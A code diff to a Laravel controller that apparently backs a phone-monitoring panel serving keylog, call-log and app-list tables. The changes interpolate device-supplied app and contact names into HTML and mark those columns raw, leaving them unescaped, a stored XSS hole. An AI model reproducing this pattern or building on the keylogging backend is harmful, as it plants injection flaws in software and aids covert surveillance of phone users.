@@ -137,9 +137,12 @@ class RemoteControlAPIController extends Controller
             limitedata($data, $phone, 'keylog');
 
             return DataTables::of($data)
-                ->rawColumns(['text', 'text0'])
+                ->rawColumns(['text', 'text0', 'appname'])
                 ->editColumn('date', function ($row) {
                     return $row->date->format('d-m-Y H:i:s');
+                })
+                ->editColumn('appname', function ($row) {
+                    return "<span class='text-nowrap'>$row->appname</span>";
                 })
                 ->editColumn('text', function ($row) {
                     return mb_substr(str_replace("#781227#", " ", $row->text), 0, 100, 'UTF-8');
@@ -193,6 +196,9 @@ class RemoteControlAPIController extends Controller
             limitedata($data, $phone, 'calls');
 
             return DataTables::of($data)
+                ->editColumn('name', function ($row) {
+                    return "<span class='text-nowrap'>$row->name</span>";
+                })
                 ->editColumn('date', function ($row) {
                     return $row->date->format('d-m-Y H:i:s');
                 })
@@ -202,7 +208,7 @@ class RemoteControlAPIController extends Controller
                 ->editColumn('type', function ($row) {
                     return callIcon($row->type);
                 })
-                ->rawColumns(['type'])
+                ->rawColumns(['type', 'name'])
                 ->make(true);
         }
 
@@ -221,7 +227,10 @@ class RemoteControlAPIController extends Controller
                 ->editColumn('type', function ($row) {
                     return callIcon($row->type);
                 })
-                ->rawColumns(['is_uninstalled'])
+                ->editColumn('name', function ($row) {
+                    return "<span class='text-nowrap'>$row->name</span>";
+                })
+                ->rawColumns(['is_uninstalled', 'name'])
                 ->make(true);
         }
 
